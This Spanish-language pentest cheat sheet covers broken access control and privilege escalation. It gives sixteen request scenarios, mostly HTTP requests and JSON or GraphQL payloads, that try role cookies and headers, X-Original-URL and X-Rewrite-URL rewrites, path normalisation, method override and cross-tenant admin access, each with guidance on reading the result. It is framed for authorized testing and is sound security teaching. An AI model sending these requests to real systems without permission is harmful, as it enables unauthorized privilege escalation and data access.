# 🗡️ Control de acceso roto y elevación de privilegios: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Funciones administrativas

```text
GET /admin
GET /admin/users
GET /api/admin/users
GET /api/v1/admin/users
GET /api/settings/roles
```

**Cuándo usarlo:** Candidatos para adaptar al producto. Comparar anónimo, usuario de prueba y administrador propio; un 200 con página de login no es acceso.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/access-control).


### Método sobre la misma ruta

```text
GET /api/users/{ID_PROPIO}
POST /api/users/{ID_PROPIO}
PATCH /api/users/{ID_PROPIO}
PUT /api/users/{ID_PROPIO}
HEAD /api/users/{ID_PROPIO}
```

**Cuándo usarlo:** Usar únicamente recursos propios y operaciones reversibles. La matriz busca autorización por método; una respuesta 405 o rechazo de validación es distinta de bypass.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/access-control).


## 🧭 Payloads por contexto

### Rol y ámbito declarados por cliente

```text
Cookie: role=user
Cookie: role=admin
X-Role: admin
X-User-Id: {ID_A}
X-Tenant-Id: {TENANT_B_PROPIO}
```

**Cuándo usarlo:** Solo variar campos que el cliente envía realmente. Si el servidor ignora estos valores, no hay fallo; comprobar efectos bajo una cuenta de bajo privilegio.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).


### Cabeceras de reescritura de ruta

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

**Cuándo usarlo:** Son dos solicitudes alternativas. Válidas cuando un proxy y un backend interpretan rutas distintas; corroborar que la acción final realmente alcanza /admin.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/access-control).


### Normalización y versiones de ruta

```text
/admin
/admin/
/ADMIN
/admin/.
/api/v1/admin
/api/v2/admin
```

**Cuándo usarlo:** Comparar controles en rutas que efectivamente apuntan a la misma función. El resultado depende del enrutador y del proxy; no atribuir bypass a una página distinta.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/access-control).


## 🔥 Payloads avanzados

### Roles y objeto en una mutación

```json
{"userId":"{ID_A}","role":"viewer"}
{"userId":"{ID_A}","role":"editor"}
{"userId":"{ID_A}","role":"admin"}
{"userId":"{ID_B}","role":"viewer"}
```

**Cuándo usarlo:** Enviar solo contra un entorno de prueba donde el cambio es reversible. La verificación debe cubrir tanto permiso de función como permiso sobre el usuario objetivo.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).


### GraphQL y API alternativa

```graphql
query { viewer { id role } }
query { users { id role } }
mutation { updateRole(userId:"{ID_A}", role:"viewer") { id } }
mutation { updateRole(userId:"{ID_A}", role:"admin") { id } }
```

**Cuándo usarlo:** Adaptar al esquema publicado o descubierto legítimamente; enviar mutaciones solo en cuentas propias. Verificar control de autorización del resolver, no solo visibilidad del campo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/graphql).


## 🔬 Pruebas guiadas por escenario

### 1. Función oculta en la UI

**Objetivo:** Pedir directamente una ruta de lectura administrativa descubierta en el tráfico propio.

```http
GET /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** La ausencia de un enlace no protege la ruta. Confirmar contenido reservado, no un 200 genérico.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 2. Sin sesión en ruta privilegiada

**Objetivo:** Repetir la misma función observada sin credenciales.

```http
GET /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Accept: application/json
```

**Interpretación:** Separar autenticación ausente de fallo de rol. Un shell público de SPA no equivale a datos administrativos.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 3. Rol aportado por cookie

**Objetivo:** Si el cliente envía una cookie de rol no firmada, cambiarla bajo la cuenta de bajo privilegio.

```http
GET /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_ROL_BAJO}; role=admin
```

**Interpretación:** Probar solo si la cookie existe en el flujo real; el servidor no debe basar la política en ese valor manipulable.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 4. Rol aportado por query

**Objetivo:** Si la app usa parámetros de vista o rol, comprobar que no sustituyen el rol de servidor.

```http
GET /api/account?admin=true&role=admin HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_ROL_BAJO}
```

**Interpretación:** Comparar una acción reservada real; que cambie la apariencia del frontend no prueba elevación.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 5. X-Original-URL

**Objetivo:** Comparar la política del proxy sobre / con la ruta interna de lectura privilegiada.

```http
GET / HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
X-Original-URL: /api/admin/settings
```

**Interpretación:** El riesgo existe si el backend sirve settings mientras la capa frontal autorizó solo /. Probar también sin el header.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 6. X-Rewrite-URL

**Objetivo:** Repetir la divergencia de ruta con el segundo header de reescritura documentado.

```http
GET / HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
X-Rewrite-URL: /api/admin/settings
```

**Interpretación:** Una redirección o respuesta de / no basta; verificar que se ejecutó la ruta protegida real.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 7. Cambio de método HTTP

**Objetivo:** En una función propia y reversible, comparar la autorización de POST y GET si ambos son aceptados.

```http
GET /api/admin/preview-report?report_id={REPORTE_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Usar una operación real de lectura o vista previa. El bypass requiere que un método alternativo alcance la misma función protegida.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 8. Mayúsculas en ruta

**Objetivo:** Cambiar solo la capitalización de una ruta privilegiada conocida.

```http
GET /API/ADMIN/SETTINGS HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Comparar resolución del backend y decisión de autorización. Si devuelve otra ruta o 404, no hay bypass.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 9. Barra final de ruta

**Objetivo:** Comparar la misma función con y sin barra final.

```http
GET /api/admin/settings/ HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** La discrepancia importa cuando ambas variantes ejecutan la misma función pero una omite el control.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 10. Sufijo en ruta

**Objetivo:** En frameworks que admiten sufijos de ruta, probar una extensión inocua en función de lectura.

```http
GET /api/admin/settings.json HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Aplica solo si el router resuelve el sufijo a la misma acción. No interpretar un archivo estático como bypass.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 11. Paso final de flujo

**Objetivo:** En un borrador propio, invocar el paso final sin completar la revisión autorizada previa.

```http
POST /api/drafts/{BORRADOR_PROPIO}/confirm HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
Content-Type: application/json

{"confirmation":"{MARCADOR_PROPIO}"}
```

**Interpretación:** Usar un flujo reversible de laboratorio. Confirmar estado persistido y que faltaba una condición de autorización.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 12. Referer como supuesta autorización

**Objetivo:** En una subruta de lectura restringida, comparar con un Referer administrativo simulado.

```http
GET /api/admin/reports/{REPORTE_PROPIO}/preview HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
Referer: https://{ORIGEN}/admin
```

**Interpretación:** Referer es controlable y no acredita rol. Solo hay fallo si se devuelve contenido o función antes denegada.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 13. Versión API alternativa

**Objetivo:** Comparar la misma función en dos versiones que el producto mantenga activas.

```http
GET /api/v1/admin/settings HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Usar únicamente versiones descubiertas en la app. Verificar equivalencia funcional con la versión protegida.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 14. Mutación GraphQL de rol alto

**Objetivo:** Invocar con rol bajo una mutación real de laboratorio diseñada para rol alto.

```graphql
mutation VistaPrevia { adminPreviewReport(id: "{REPORTE_PROPIO}") { id status } }
```

**Interpretación:** El resolver debe aplicar política aunque la UI o la introspección escondan la operación; confirmar resultado efectivo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 15. X-HTTP-Method-Override

**Objetivo:** Solo si la aplicación admite override, comparar el control de una lectura administrativa por método original y efectivo.

```http
POST /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
X-HTTP-Method-Override: GET
Content-Type: application/json

{}
```

**Interpretación:** Debe aplicarse la misma política a la operación efectiva. Un 405 o 404 indica que el override no alcanzó la función.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 16. Administrador de otro tenant

**Objetivo:** Con dos tenants propios, usar un administrador de A para leer configuración reservada de B.

```http
GET /api/tenants/{TENANT_B_PROPIO}/admin/settings HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ADMIN_TENANT_A}
```

**Interpretación:** El rol admin de A no concede autoridad sobre B; confirmar datos específicos de B y la política multi-tenant.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
